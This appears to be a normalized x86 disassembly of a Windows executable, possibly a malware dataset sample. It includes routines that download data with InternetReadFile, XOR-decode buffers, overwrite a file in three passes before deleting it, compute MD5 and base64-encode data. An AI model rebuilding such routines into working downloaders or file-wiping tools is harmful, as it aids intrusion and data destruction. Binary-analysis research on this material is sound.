mov esi [ InternetCloseHandle@IAT ]
mov [ ebx + edi ] 0x0
mov [ rw-data ] ebx
call esi
push ebp
call esi
mov eax [ esp + 0x10 ]
push eax
call esi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
add ebx eax
lea ecx [ ebx + 0x400 ]
push ecx
push edi
call realloc
add esp 0x8
mov edi eax
jmp r-xdata
lea edx [ esp + 0x1c ]
lea eax [ ebx + edi ]
push edx
push 0x3ff
push eax
push esi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_402690
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
test edx edx
mov eax rw-data
jle r-xdata
retn
push ebx
push esi
mov esi edx
mov dl [ eax ]
mov bl [ ecx ]
add dl 0x17
xor bl dl
inc eax
mov [ ecx ] bl
inc ecx
dec esi
jne r-xdata
mov eax rw-data
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
sub_4026d0
sub esp 0x10
mov al 0x1
mov cl 0x10
mov [ esp ] al
mov [ esp + 0x1 ] al
mov al 0x4
mov [ esp + 0x3 ] cl
mov [ esp + 0x4 ] al
mov [ esp + 0x5 ] al
mov al 0x8
mov [ esp + 0x8 ] cl
mov [ esp + 0x6 ] al
mov [ esp + 0x7 ] al
mov al 0x40
push esi
mov esi [ esp + 0x18 ]
mov [ esp + 0xf ] al
mov [ esp + 0x10 ] al
mov cl 0x20
mov al 0x80
push edi
mov [ esp + 0x12 ] cl
mov [ esp + 0x15 ] cl
mov [ esp + 0x16 ] al
mov [ esp + 0x17 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
mov dl 0x2
[ edi ]
not ecx
dec ecx
xor edi edi
test ecx ecx
mov [ esp + 0xa ] dl
mov [ esp + 0x11 ] dl
mov [ esp + 0x1c ] ecx
jle r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
cmp [ ecx + esi ] 0x20
jne r-xdata
push ebx
push ebp
mov [ ecx + esi + 0x1 ] 0x0
pop edi
pop esi
add esp 0x10
retn
xor eax eax
not bl
and dl bl
or dl bl
jmp r-xdata
mov [ ecx + esi + 0x1 ] al
pop edi
pop esi
add esp 0x10
retn
mov dl [ ecx + esi - 0x1 ]
dec ecx
cmp dl 0x20
je r-xdata
test [ eax - 0x1 ] cl
mov bl [ eax ]
je r-xdata
mov eax [ esp + 0x24 ]
mov [ edi + esi ] dl
inc edi
cmp edi eax
jl r-xdata
add eax 0x2
dec ebp
jne r-xdata
cmp ecx eax
jle r-xdata
mov cl [ edi + esi ]
xor dl dl
lea eax [ esp + 0x11 ]
mov ebp 0x8
pop ebp
pop ebx
sub_4027b0
push ecx
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov [ esp + 0x10 ] 0x0
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
pop ecx
retn
push 0x80
push edi
call [ SetFileAttributesA@IAT ]
push rw-data
push edi
call fopen
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax 0x7
pop ebx
pop ecx
retn
mov eax [ ebx + 0x10 ]
push eax
call _filelength
push ebx
mov esi eax
call fclose
add esp 0x8
test esi esi
jle r-xdata
push edi
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
pop edi
pop esi
add eax 0x6
pop ebx
pop ecx
retn
push esi
call malloc
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
pop ecx
retn
push ebp
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov ecx esi
or eax 0xffffffff
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov [ esp + 0x10 ] 0x1
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov [ esp + 0x10 ] 0x1
mov esi [ esp + 0x10 ]
mov ecx esi
mov eax 0x55555555
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov esi 0x1
jmp r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
pop ecx
retn
push edi
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
pop edi
pop esi
add eax 0x2
pop ebx
pop ecx
retn
push ebx
call free
add esp 0x4
cmp esi 0x1
pop ebp
jne r-xdata
sub_402970
mov edx [ esp + 0x4 ]
push edi
xor eax eax
mov ecx 0x10
lea edi [ edx + 0x18 ]
mov [ edx ] 0x67452301
mov [ edx + 0x4 ] 0xefcdab89
mov [ edx + 0x8 ] 0x98badcfe
mov [ edx + 0xc ] 0x10325476
mov [ edx + 0x10 ] eax
mov [ edx + 0x14 ] eax
push edx
[ edi ]
push rw-data
call sub_4034c0
add esp 0x8
pop edi
retn
sub_4029c0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x14 ]
mov eax [ ebx + 0x10 ]
push esi
push edi
lea ecx [ eax + ebp * 8 ]
cmp ecx eax
mov [ ebx + 0x10 ] ecx
jae r-xdata
mov esi [ ebx + 0x14 ]
mov ecx ebp
shr ecx 0x1d
shr eax 0x3
add esi ecx
and eax 0x3f
mov [ ebx + 0x14 ] esi
je r-xdata
inc [ ebx + 0x14 ]
cmp ebp 0x40
jb r-xdata
mov ecx 0x40
lea edi [ eax + ebx + 0x18 ]
sub ecx eax
cmp ebp ecx
mov [ esp + 0x14 ] ecx
jae r-xdata
mov esi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
lea edi [ ebx + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax ebp
shr eax 0x6
mov [ esp + 0x14 ] eax
mov esi [ esp + 0x18 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebx + 0x18 ]
push ecx
push ebx
call sub_402bf0
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
add edx eax
add esp 0xc
mov [ esp + 0x18 ] edx
sub ebp eax
mov esi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ esp + 0x18 ]
lea eax [ ebx + 0x18 ]
mov ecx 0x10
mov edi eax
push ebx
push eax
[ edi ] [ esi ]
push ebx
call sub_402bf0
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
add esp 0xc
add edx 0x40
sub ebp 0x40
dec eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] eax
jne r-xdata
sub_402ab0
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx 0x3f
mov eax [ esi + 0x10 ]
shr eax 0x3
and eax 0x3f
sub ecx eax
lea edi [ eax + esi + 0x18 ]
mov [ edi ] 0x80
inc edi
cmp ecx 0x8
jae r-xdata
add ecx 0xfffffff8
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
lea edi [ esi + 0x18 ]
push edi
push esi
call sub_402bf0
add esp 0xc
mov ecx 0xe
xor eax eax
[ edi ]
jmp r-xdata
mov al [ esi + 0x10 ]
push esi
mov [ esi + 0x50 ] al
mov eax [ esi + 0x10 ]
mov ecx eax
mov edx eax
shr eax 0x18
mov [ esi + 0x53 ] al
mov al [ esi + 0x14 ]
shr ecx 0x8
shr edx 0x10
mov [ esi + 0x54 ] al
mov eax [ esi + 0x14 ]
mov [ esi + 0x51 ] cl
mov [ esi + 0x52 ] dl
mov ecx eax
mov edx eax
shr eax 0x18
mov [ esi + 0x57 ] al
lea eax [ esi + 0x18 ]
shr ecx 0x8
shr edx 0x10
push eax
push esi
mov [ esi + 0x55 ] cl
mov [ esi + 0x56 ] dl
call sub_402bf0
mov eax [ esp + 0x18 ]
mov cl [ esi ]
add esp 0xc
mov [ eax ] cl
mov edx [ esi ]
shr edx 0x8
mov [ eax + 0x1 ] dl
mov ecx [ esi ]
shr ecx 0x10
mov [ eax + 0x2 ] cl
mov edx [ esi ]
shr edx 0x18
mov [ eax + 0x3 ] dl
mov cl [ esi + 0x4 ]
mov [ eax + 0x4 ] cl
mov edx [ esi + 0x4 ]
shr edx 0x8
mov [ eax + 0x5 ] dl
mov ecx [ esi + 0x4 ]
shr ecx 0x10
mov [ eax + 0x6 ] cl
mov edx [ esi + 0x4 ]
shr edx 0x18
mov [ eax + 0x7 ] dl
mov cl [ esi + 0x8 ]
mov [ eax + 0x8 ] cl
mov edx [ esi + 0x8 ]
shr edx 0x8
mov [ eax + 0x9 ] dl
mov ecx [ esi + 0x8 ]
shr ecx 0x10
mov [ eax + 0xa ] cl
mov edx [ esi + 0x8 ]
shr edx 0x18
mov [ eax + 0xb ] dl
mov cl [ esi + 0xc ]
mov [ eax + 0xc ] cl
mov edx [ esi + 0xc ]
shr edx 0x8
mov [ eax + 0xd ] dl
mov ecx [ esi + 0xc ]
shr ecx 0x10
mov [ eax + 0xe ] cl
mov edx [ esi + 0xc ]
shr edx 0x18
mov [ eax + 0xf ] dl
mov [ esi ] 0x0
pop edi
pop esi
retn
sub_402bf0
mov eax [ esp + 0xc ]
sub esp 0x40
push ebx
push ebp
push esi
push edi
push eax
push rw-data
call sub_4034c0
mov ecx [ esp + 0x60 ]
add esp 0x8
lea esi [ esp + 0x10 ]
mov edi 0x10
lea eax [ ecx + 0x2 ]
xor edx edx
xor ecx ecx
mov dh [ eax + 0x1 ]
mov cl [ eax - 0x1 ]
mov dl [ eax ]
add eax 0x4
shl edx 0x8
or edx ecx
xor ecx ecx
mov cl [ eax - 0x6 ]
add esi 0x4
shl edx 0x8
or edx ecx
dec edi
mov [ esi - 0x4 ] edx
jne r-xdata
mov ebx [ esp + 0x54 ]
mov ebp [ esp + 0x14 ]
mov edi [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov esi [ ebx + 0x4 ]
mov eax [ ebx ]
mov ecx edi
xor ecx edx
and ecx esi
xor ecx edi
add ecx eax
mov eax [ esp + 0x10 ]
lea ecx [ ecx + eax - 0x28955b88 ]
mov eax ecx
shr eax 0x19
shl ecx 0x7
or eax ecx
mov ecx edx
add eax esi
xor ecx esi
and ecx eax
xor ecx edx
add ecx ebp
mov ebp [ esp + 0x18 ]
lea edi [ edi + ecx - 0x173848aa ]
mov ecx edi
shl edi 0xc
shr ecx 0x14
or ecx edi
mov edi esi
xor edi eax
add ecx eax
and edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ edx + edi + 0x242070db ]
mov edx edi
shr edx 0xf
shl edi 0x11
or edx edi
mov edi ecx
add edx ecx
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ esi + edi - 0x3e423112 ]
mov esi edi
shl esi 0x16
shr edi 0xa
or esi edi
mov edi ecx
add esi edx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x24 ]
lea edi [ eax + edi - 0xa83f051 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
add eax esi
xor edi esi
and edi eax
xor edi edx
add edi ebp
lea edi [ ecx + edi + 0x4787c62a ]
mov ecx edi
shr ecx 0x14
shl edi 0xc
or ecx edi
mov edi esi
add ecx eax
xor edi eax
and edi ecx
xor edi esi
mov ebp [ esp + 0x28 ]
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ edx + edi - 0x57cfb9ed ]
mov edx edi
shl edi 0x11
shr edx 0xf
or edx edi
mov edi ecx
xor edi eax
add edx ecx
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x30 ]
lea edi [ esi + edi - 0x2b96aff ]
mov esi edi
shr edi 0xa
shl esi 0x16
or esi edi
mov edi ecx
xor edi edx
add esi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ eax + edi + 0x698098d8 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
xor edi esi
add eax esi
and edi eax
xor edi edx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ ecx + edi - 0x74bb0851 ]
mov ecx edi
shr ecx 0x14
shl edi 0xc
or ecx edi
mov edi esi
add ecx eax
xor edi eax
and edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x3c ]
lea edi [ edx + edi - 0xa44f ]
mov edx edi
shr edx 0xf
shl edi 0x11
or edx edi
mov edi ecx
add edx ecx
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ esi + edi - 0x76a32842 ]
mov esi edi
shl esi 0x16
shr edi 0xa
or esi edi
mov edi ecx
add esi edx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
lea edi [ eax + edi + 0x6b901122 ]
mov eax edi
shr eax 0x19
shl edi 0x7
or eax edi
mov edi edx
add eax esi
mov ebp [ esp + 0x44 ]
xor edi esi
and edi eax
xor edi edx
add edi ebp
mov ebp [ esp + 0x48 ]
lea ecx [ ecx + edi - 0x2678e6d ]
mov edi ecx
shr edi 0x14
shl ecx 0xc
or edi ecx
mov ecx esi
add edi eax
xor ecx eax
and ecx edi
xor ecx esi
add ecx ebp
mov ebp [ esp + 0x4c ]
lea edx [ edx + ecx - 0x5986bc72 ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
mov edx edi
add ecx edi
xor edx eax
and edx ecx
xor edx eax
add edx ebp
mov ebp [ esp + 0x14 ]
lea esi [ esi + edx + 0x49b40821 ]
mov edx esi
shl edx 0x16
shr esi 0xa
or edx esi
mov esi ecx
add edx ecx
xor esi edx
and esi edi
xor esi ecx
add esi ebp
mov ebp [ esp + 0x28 ]
lea esi [ eax + esi - 0x9e1da9e ]
mov eax esi
shr eax 0x1b
shl esi 0x5
or eax esi
mov esi edx
add eax edx
xor esi eax
and esi ecx
xor esi edx
add esi ebp
mov ebp [ esp + 0x3c ]
lea edi [ edi + esi - 0x3fbf4cc0 ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x10 ]
lea edi [ ecx + edi + 0x265e5a51 ]
mov ecx edi
shr ecx 0x12
shl edi 0xe
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
lea edi [ edx + edi - 0x16493856 ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov ebp [ esp + 0x24 ]
add edx ecx
mov edi ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ eax + edi - 0x29d0efa3 ]
mov eax edi
shl edi 0x5
shr eax 0x1b
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ esi + edi + 0x2441453 ]
mov esi edi
shl edi 0x9
shr esi 0x17
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ ecx + edi - 0x275e197f ]
mov ecx edi
shr ecx 0x12
shl edi 0xe
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ edx + edi - 0x182c0438 ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov edi ecx
add edx ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x48 ]
lea edi [ eax + edi + 0x21e1cde6 ]
mov eax edi
shr eax 0x1b
shl edi 0x5
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ esi + edi - 0x3cc8f82a ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
lea edi [ ecx + edi - 0xb2af279 ]
mov ecx edi
mov ebp [ esp + 0x30 ]
shl edi 0xe
shr ecx 0x12
or ecx edi
mov edi esi
add ecx esi
xor edi ecx
and edi eax
xor edi esi
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ edx + edi + 0x455a14ed ]
mov edx edi
shl edx 0x14
shr edi 0xc
or edx edi
mov edi ecx
add edx ecx
xor edi edx
and edi esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x18 ]
lea edi [ eax + edi - 0x561c16fb ]
mov eax edi
shr eax 0x1b
shl edi 0x5
or eax edi
mov edi edx
add eax edx
xor edi eax
and edi ecx
xor edi edx
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ esi + edi - 0x3105c08 ]
mov esi edi
shr esi 0x17
shl edi 0x9
or esi edi
add esi eax
mov edi esi
xor edi eax
and edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x40 ]
lea ecx [ ecx + edi + 0x676f02d9 ]
mov edi ecx
shr edi 0x12
shl ecx 0xe
or edi ecx
mov ecx esi
add edi esi
xor ecx edi
mov [ esp + 0x58 ] ecx
and ecx eax
xor ecx esi
add ecx ebp
mov ebp [ esp + 0x24 ]
lea edx [ edx + ecx - 0x72d5b376 ]
mov ecx edx
shl ecx 0x14
shr edx 0xc
or ecx edx
mov edx [ esp + 0x58 ]
add ecx edi
xor edx ecx
add edx ebp
mov ebp [ esp + 0x30 ]
lea edx [ eax + edx - 0x5c6be ]
mov eax edx
shr eax 0x1c
shl edx 0x4
or eax edx
mov edx edi
add eax ecx
xor edx ecx
xor edx eax
add edx ebp
lea esi [ esi + edx - 0x788e097f ]
mov ebp [ esp + 0x3c ]
mov edx esi
shr edx 0x15
shl esi 0xb
or edx esi
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi ebp
mov ebp [ esp + 0x48 ]
lea edi [ edi + esi + 0x6d9d6122 ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x14 ]
lea edi [ ecx + edi - 0x21ac7f4 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ eax + edi - 0x5b4115bc ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ edx + edi + 0x4bdecfa9 ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ esi + edi - 0x944b4a0 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ ecx + edi - 0x41404390 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
lea edi [ eax + edi + 0x289b7ec6 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
mov ebp [ esp + 0x10 ]
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ edx + edi - 0x155ed806 ]
mov edx edi
shl edi 0xb
shr edx 0x15
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x28 ]
lea edi [ esi + edi - 0x2b10cf7b ]
mov esi edi
shl edi 0x10
shr esi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
mov [ esp + 0x58 ] edi
xor edi eax
add edi ebp
mov ebp [ esp + 0x34 ]
lea edi [ ecx + edi + 0x4881d05 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ esp + 0x58 ]
add ecx esi
xor edi ecx
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ eax + edi - 0x262b2fc7 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi esi
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ edx + edi - 0x1924661b ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x18 ]
lea edi [ esi + edi + 0x1fa27cf8 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
mov edi edx
add esi edx
xor edi esi
xor edi eax
add edi ebp
lea edi [ ecx + edi - 0x3b53a99b ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi edx
add ecx esi
not edi
mov ebp [ esp + 0x10 ]
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x2c ]
lea edi [ eax + edi - 0xbd6ddbc ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
not edi
add eax ecx
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x48 ]
lea edi [ edx + edi + 0x432aff97 ]
mov edx edi
shl edi 0xa
shr edx 0x16
or edx edi
mov edi ecx
not edi
add edx eax
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x24 ]
lea edi [ esi + edi - 0x546bdc59 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi eax
add esi edx
not edi
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x40 ]
lea edi [ ecx + edi - 0x36c5fc7 ]
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov edi edx
add ecx esi
not edi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x1c ]
lea edi [ eax + edi + 0x655b59c3 ]
mov eax edi
shr eax 0x1a
shl edi 0x6
or eax edi
mov edi esi
add eax ecx
not edi
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x38 ]
lea edi [ edx + edi - 0x70f3336e ]
mov edx edi
shr edx 0x16
shl edi 0xa
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
lea edi [ esi + edi - 0x100b83 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov ebp [ esp + 0x14 ]
mov edi eax
not edi
add esi edx
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x30 ]
lea edi [ ecx + edi - 0x7a7ba22f ]
mov ecx edi
shr edi 0xb
shl ecx 0x15
or ecx edi
mov edi edx
not edi
add ecx esi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x4c ]
lea edi [ eax + edi + 0x6fa87e4f ]
mov eax edi
shl edi 0x6
shr eax 0x1a
or eax edi
mov edi esi
not edi
add eax ecx
or edi eax
xor edi ecx
add edi ebp
mov ebp [ esp + 0x28 ]
lea edi [ edx + edi - 0x1d31920 ]
mov edx edi
shr edx 0x16
shl edi 0xa
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x44 ]
lea edi [ esi + edi - 0x5cfebcec ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi eax
add esi edx
not edi
or edi esi
xor edi edx
add edi ebp
mov ebp [ esp + 0x20 ]
lea edi [ ecx + edi + 0x4e0811a1 ]
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov edi edx
add ecx esi
not edi
or edi ecx
xor edi esi
add edi ebp
mov ebp [ esp + 0x3c ]
lea edi [ eax + edi - 0x8ac817e ]
mov eax edi
shr eax 0x1a
shl edi 0x6
or eax edi
mov edi esi
add eax ecx
not edi
or edi eax
xor edi ecx
add edi ebp
lea edi [ edx + edi - 0x42c50dcb ]
mov edx edi
shr edx 0x16
shl edi 0xa
mov ebp [ esp + 0x18 ]
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi ebp
mov ebp [ esp + 0x34 ]
lea esi [ esi + edi + 0x2ad7d2bb ]
mov edi esi
shr edi 0x11
shl esi 0xf
or edi esi
mov esi eax
add edi edx
not esi
or esi edi
xor esi edx
add esi ebp
lea ecx [ ecx + esi - 0x14792c6f ]
mov esi [ ebx ]
add esi eax
mov eax ecx
shl eax 0x15
shr ecx 0xb
or eax ecx
mov ecx [ ebx + 0x4 ]
add eax ecx
mov ecx [ esp + 0x5c ]
add eax edi
push ecx
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0x8 ]
add eax edi
push rw-data
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
add eax edx
mov [ ebx ] esi
mov [ ebx + 0xc ] eax
call sub_4034c0
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn
sub_4034d0
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax 0x55555556
lea ecx [ edi * 4 ]
imul ecx
mov eax edx
shr eax 0x1f
lea ecx [ edx + eax + 0x4 ]
push ecx
call malloc
mov edx [ esp + 0x10 ]
mov esi eax
push esi
push edi
push edx
call sub_403510
add esp 0x10
mov eax esi
pop edi
pop esi
retn
sub_403510
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebp 0x3
push edi
jl r-xdata
mov eax [ esp + 0x10 ]
mov eax 0xaaaaaaab
mul ebp
mov edi edx
shr edi 0x1
lea eax [ edi * 4 ]
sub eax edi
neg eax
add ebp eax
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov [ esi ] 0x0
mov eax esi
pop edi
pop esi
sub eax ecx
pop ebp
retn
mov edx [ rw-data ]
xor ecx ecx
mov cl [ eax ]
shr ecx 0x2
cmp ebp 0x1
mov cl [ ecx + edx ]
mov [ esi ] cl
mov cl 0x3d
jne r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov cl [ eax ]
add eax 0x3
shr ecx 0x2
add esi 0x4
mov cl [ ecx + edx ]
mov [ esi - 0x4 ] cl
mov dl [ eax - 0x3 ]
xor ecx ecx
and edx 0x3
mov cl [ eax - 0x2 ]
shl edx 0x4
shr ecx 0x4
or edx ecx
mov ecx [ rw-data ]
mov dl [ edx + ecx ]
mov [ esi - 0x3 ] dl
mov cl [ eax - 0x2 ]
xor edx edx
and ecx 0xf
mov dl [ eax - 0x1 ]
shl ecx 0x2
shr edx 0x6
or ecx edx
mov edx [ rw-data ]
mov cl [ ecx + edx ]
mov [ esi - 0x2 ] cl
mov dl [ eax - 0x1 ]
mov ecx [ rw-data ]
and edx 0x3f
dec edi
mov dl [ edx + ecx ]
mov [ esi - 0x1 ] dl
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov edi [ rw-data ]
push ebx
xor ebx ebx
mov bl [ eax + 0x1 ]
and edx 0x3
shl edx 0x4
shr ebx 0x4
or edx ebx
pop ebx
mov dl [ edx + edi ]
mov [ esi + 0x1 ] dl
mov al [ eax + 0x1 ]
mov edx [ rw-data ]
and eax 0xf
mov al [ edx + eax * 4 ]
mov [ esi + 0x2 ] al
mov dl [ eax ]
mov eax [ rw-data ]
and edx 0x3
shl edx 0x4
mov dl [ edx + eax ]
mov [ esi + 0x2 ] cl
mov [ esi + 0x1 ] dl
jmp r-xdata
test ebp ebp
jle r-xdata
mov [ esi + 0x3 ] cl
add esi 0x4
sub_4036b0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403871
cmp [ rw-data ] ebx
jne r-xdata
call sub_40385c
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
